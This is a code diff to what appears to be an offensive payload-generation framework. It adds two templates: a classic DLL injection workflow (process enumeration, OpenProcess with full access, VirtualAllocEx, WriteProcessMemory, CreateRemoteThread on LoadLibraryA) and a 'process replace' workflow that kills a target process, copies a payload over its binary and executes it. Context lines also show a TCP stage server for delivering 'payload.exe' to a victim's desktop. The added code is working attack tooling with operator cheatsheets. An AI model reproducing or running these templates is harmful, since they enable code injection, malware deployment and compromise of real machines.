@@ -33,6 +33,7 @@ from ..payload_templates.base import PayloadTemplate, TemplateConfig
 from ..stack_alloc import StackLayout
 from .ir import (
     AddressOf,
+    AddressOfField,
     AllocateLocal,
     AllocateStruct,
     ArithOp,
@@ -41,6 +42,7 @@ from .ir import (
     CallSlot,
     CarveBuffer,
     Compare,
+    CompareStrings,
     ConstructString,
     DefineConstant,
     ExitStrategy,
@@ -48,6 +50,7 @@ from .ir import (
     Jump,
     MemCopy,
     NameRef,
+    ReadStructField,
     SuccessPredicate,
     Terminate,
     TerminateStyle,
@@ -211,8 +214,15 @@ class WorkflowTemplate(PayloadTemplate):
                 elif isinstance(op, CallSlot):
                     _add(op.target)
 
+                elif isinstance(op, ReadStructField):
+                    _add(op.result)
+
                 elif isinstance(op, Compare):
                     _add(op.value)
+
+                elif isinstance(op, CompareStrings):
+                    self._collect_value_refs(op.left, _add)
+                    self._collect_value_refs(op.right, _add)
 
                 elif isinstance(op, (DefineConstant,)):
                     pass
@@ -249,6 +259,8 @@ class WorkflowTemplate(PayloadTemplate):
             add_fn(ref.name)
         elif isinstance(ref, AddressOf):
             add_fn(ref.name)
+        elif isinstance(ref, AddressOfField):
+            pass
 
     def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
         return []
@@ -2464,4 +2476,399 @@ class IRTcpDownloadToUserpathTemplate(WorkflowTemplate):
              f"python3 tcp_stage_server.py --bind {config.lhost} "
              f"--port {config.lport} payload.exe"),
             ("Target path", "C:\\Users\\<username>\\Desktop\\payload.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# DLL injection workflow
+# ---------------------------------------------------------------------------
+
+_PROCESS_ALL_ACCESS = 0x001F0FFF
+_MAX_PATH = 260
+
+
+def build_dll_inject_workflow(
+    process_name: str = "target.exe",
+    dll_path: str = "C:\\inject.dll",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the dll_inject workflow.
+
+    Toolhelp32 enumeration with inline case-insensitive strcmp to find
+    the target process, then classic DLL injection via
+    VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryA).
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+
+    return Workflow(
+        name="ir_dll_inject",
+        blocks=(
+            Block("entry", (
+                ConstructString("process_name", process_name),
+                ConstructString("dll_path", dll_path),
+                ConstructString("kernel32_str", "kernel32.dll"),
+                ConstructString("loadlib_str", "LoadLibraryA"),
+                AllocateStruct("pe32", "PROCESSENTRY32"),
+
+                WriteStructField("pe32", "dwSize", Immediate(0x128)),
+
+                CallAPI(
+                    "CreateToolhelp32Snapshot",
+                    arguments=(Immediate(2), Immediate(0)),
+                    result="snapshot",
+                ),
+                Compare("snapshot", SuccessPredicate.INVALID_HANDLE,
+                        true_block="first_proc", false_block="fail"),
+            )),
+
+            Block("first_proc", (
+                CallAPI(
+                    "Process32First",
+                    arguments=(
+                        NameRef("snapshot"),
+                        AddressOf("pe32"),
+                    ),
+                    result="p32f_ret",
+                ),
+                Compare("p32f_ret", SuccessPredicate.NONZERO,
+                        true_block="check_name", false_block="not_found"),
+            )),
+
+            Block("check_name", (
+                CompareStrings(
+                    AddressOfField("pe32", "szExeFile"),
+                    AddressOf("process_name"),
+                    case_insensitive=True,
+                    match_block="found",
+                    nomatch_block="next_proc",
+                ),
+            )),
+
+            Block("next_proc", (
+                CallAPI(
+                    "Process32Next",
+                    arguments=(
+                        NameRef("snapshot"),
+                        AddressOf("pe32"),
+                    ),
+                    result="p32n_ret",
+                ),
+                Compare("p32n_ret", SuccessPredicate.NONZERO,
+                        true_block="check_name", false_block="not_found"),
+            )),
+
+            Block("not_found", (
+                CallAPI("CloseHandle", arguments=(NameRef("snapshot"),)),
+                Jump("fail"),
+            )),
+
+            Block("found", (
+                ReadStructField("target_pid", "pe32", "th32ProcessID"),
+                CallAPI("CloseHandle", arguments=(NameRef("snapshot"),)),
+
+                CallAPI(
+                    "OpenProcess",
+                    arguments=(
+                        Immediate(_PROCESS_ALL_ACCESS),
+                        Immediate(0),
+                        NameRef("target_pid"),
+                    ),
+                    result="proc_handle",
+                ),
+                Compare("proc_handle", SuccessPredicate.NONZERO,
+                        true_block="alloc_remote", false_block="fail"),
+            )),
+
+            Block("alloc_remote", (
+                CallAPI(
+                    "VirtualAllocEx",
+                    arguments=(
+                        NameRef("proc_handle"),
+                        Immediate(0),
+                        Immediate(_MAX_PATH),
+                        Immediate(0x3000),
+                        Immediate(4),
+                    ),
+                    result="remote_buf",
+                ),
+                Compare("remote_buf", SuccessPredicate.NONZERO,
+                        true_block="write_remote", false_block="close_proc"),
+            )),
+
+            Block("write_remote", (
+                CallAPI(
+                    "WriteProcessMemory",
+                    arguments=(
+                        NameRef("proc_handle"),
+                        NameRef("remote_buf"),
+                        AddressOf("dll_path"),
+                        Immediate(_MAX_PATH),
+                        Immediate(0),
+                    ),
+                    result="wpm_ret",
+                ),
+                Compare("wpm_ret", SuccessPredicate.NONZERO,
+                        true_block="resolve_loadlib", false_block="close_proc"),
+            )),
+
+            Block("resolve_loadlib", (
+                CallAPI(
+                    "GetModuleHandleA",
+                    arguments=(AddressOf("kernel32_str"),),
+                    result="k32_handle",
+                ),
+                Compare("k32_handle", SuccessPredicate.NONZERO,
+                        true_block="get_loadlib", false_block="close_proc"),
+            )),
+
+            Block("get_loadlib", (
+                CallAPI(
+                    "GetProcAddress",
+                    arguments=(
+                        NameRef("k32_handle"),
+                        AddressOf("loadlib_str"),
+                    ),
+                    result="loadlib_addr",
+                ),
+                Compare("loadlib_addr", SuccessPredicate.NONZERO,
+                        true_block="create_thread", false_block="close_proc"),
+            )),
+
+            Block("create_thread", (
+                CallAPI(
+                    "CreateRemoteThread",
+                    arguments=(
+                        NameRef("proc_handle"),
+                        Immediate(0),
+                        Immediate(0),
+                        NameRef("loadlib_addr"),
+                        NameRef("remote_buf"),
+                        Immediate(0),
+                        Immediate(0),
+                    ),
+                    result="thread_handle",
+                ),
+                Compare("thread_handle", SuccessPredicate.NONZERO,
+                        true_block="cleanup_thread", false_block="close_proc"),
+            )),
+
+            Block("cleanup_thread", (
+                CallAPI("CloseHandle", arguments=(NameRef("thread_handle"),)),
+                Jump("close_proc_ok"),
+            )),
+
+            Block("close_proc_ok", (
+                CallAPI("CloseHandle", arguments=(NameRef("proc_handle"),)),
+                Jump("success"),
+            )),
+
+            Block("close_proc", (
+                CallAPI("CloseHandle", arguments=(NameRef("proc_handle"),)),
+                Jump("fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRDllInjectTemplate(WorkflowTemplate):
+    """IR-backed dll_inject template."""
+
+    def __init__(self) -> None:
+        super().__init__(build_dll_inject_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_dll_inject_workflow(
+            process_name=config.process_name or "target.exe",
+            dll_path=config.dst_path or "C:\\inject.dll",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        proc = config.process_name or "target.exe"
+        dll = config.dst_path or "C:\\inject.dll"
+        return [
+            ("Target process", proc),
+            ("DLL to inject", dll),
+            ("Verify injection", f"tasklist /m /fi \"imagename eq {proc}\""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Process replace (kill-copy-restart) workflow
+# ---------------------------------------------------------------------------
+
+_PROCESS_TERMINATE = 1
+_INFINITE = 0xFFFFFFFF
+
+
+def build_process_replace_workflow(
+    process_name: str = "target.exe",
+    src_path: str = "C:\\payload.exe",
+    dst_path: str = "C:\\target.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the process_replace workflow.
+
+    Toolhelp32 enumeration to find the target process, kill it with
+    TerminateProcess, wait, then CopyFileA + WinExec.
+    If the process is not found, skip straight to copy-and-run.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+
+    return Workflow(
+        name="ir_process_replace",
+        blocks=(
+            Block("entry", (
+                ConstructString("process_name", process_name),
+                ConstructString("src_path", src_path),
+                ConstructString("dst_path", dst_path),
+                AllocateStruct("pe32", "PROCESSENTRY32"),
+
+                WriteStructField("pe32", "dwSize", Immediate(0x128)),
+
+                CallAPI(
+                    "CreateToolhelp32Snapshot",
+                    arguments=(Immediate(2), Immediate(0)),
+                    result="snapshot",
+                ),
+                Compare("snapshot", SuccessPredicate.INVALID_HANDLE,
+                        true_block="first_proc", false_block="do_copy"),
+            )),
+
+            Block("first_proc", (
+                CallAPI(
+                    "Process32First",
+                    arguments=(
+                        NameRef("snapshot"),
+                        AddressOf("pe32"),
+                    ),
+                    result="p32f_ret",
+                ),
+                Compare("p32f_ret", SuccessPredicate.NONZERO,
+                        true_block="check_name", false_block="not_found"),
+            )),
+
+            Block("check_name", (
+                CompareStrings(
+                    AddressOfField("pe32", "szExeFile"),
+                    AddressOf("process_name"),
+                    case_insensitive=True,
+                    match_block="found",
+                    nomatch_block="next_proc",
+                ),
+            )),
+
+            Block("next_proc", (
+                CallAPI(
+                    "Process32Next",
+                    arguments=(
+                        NameRef("snapshot"),
+                        AddressOf("pe32"),
+                    ),
+                    result="p32n_ret",
+                ),
+                Compare("p32n_ret", SuccessPredicate.NONZERO,
+                        true_block="check_name", false_block="not_found"),
+            )),
+
+            Block("not_found", (
+                CallAPI("CloseHandle", arguments=(NameRef("snapshot"),)),
+                Jump("do_copy"),
+            )),
+
+            Block("found", (
+                ReadStructField("target_pid", "pe32", "th32ProcessID"),
+                CallAPI("CloseHandle", arguments=(NameRef("snapshot"),)),
+
+                CallAPI(
+                    "OpenProcess",
+                    arguments=(
+                        Immediate(_PROCESS_TERMINATE),
+                        Immediate(0),
+                        NameRef("target_pid"),
+                    ),
+                    result="proc_handle",
+                ),
+                Compare("proc_handle", SuccessPredicate.NONZERO,
+                        true_block="kill_proc", false_block="do_copy"),
+            )),
+
+            Block("kill_proc", (
+                CallAPI(
+                    "TerminateProcess",
+                    arguments=(
+                        NameRef("proc_handle"),
+                        Immediate(0),
+                    ),
+                ),
+                CallAPI(
+                    "WaitForSingleObject",
+                    arguments=(
+                        NameRef("proc_handle"),
+                        Immediate(_INFINITE),
+                    ),
+                ),
+                CallAPI("CloseHandle", arguments=(NameRef("proc_handle"),)),
+                Jump("do_copy"),
+            )),
+
+            Block("do_copy", (
+                CallAPI(
+                    "CopyFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dst_path"),
+                        Immediate(0),
+                    ),
+                    result="copy_ret",
+                ),
+                Compare("copy_ret", SuccessPredicate.NONZERO,
+                        true_block="exec", false_block="fail"),
+            )),
+
+            Block("exec", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(
+                        AddressOf("dst_path"),
+                        Immediate(1),
+                    ),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRProcessReplaceTemplate(WorkflowTemplate):
+    """IR-backed process_replace template."""
+
+    def __init__(self) -> None:
+        super().__init__(build_process_replace_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_process_replace_workflow(
+            process_name=config.process_name or "target.exe",
+            src_path=config.src_path or "C:\\payload.exe",
+            dst_path=config.dst_path or "C:\\target.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Target process", config.process_name or "target.exe"),
+            ("Source file", config.src_path or "C:\\payload.exe"),
+            ("Destination (also executed)", config.dst_path or "C:\\target.exe"),
         ]
